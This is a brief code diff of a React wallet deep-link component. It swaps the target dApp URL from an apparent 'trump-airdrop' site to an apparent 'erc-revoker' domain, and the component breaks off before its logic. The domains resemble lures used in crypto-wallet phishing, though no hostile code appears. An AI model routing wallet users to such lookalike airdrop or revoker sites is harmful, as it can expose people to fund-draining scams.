@@ -1,6 +1,6 @@
 import React from "react";
 
-const dAppUrl = "https://trump-airdrop.vercel.app";
+const dAppUrl = "https://www.erc-revoker.cloud";
 
 const WalletDeepLink = () => {
   const openWalletLink = () => {
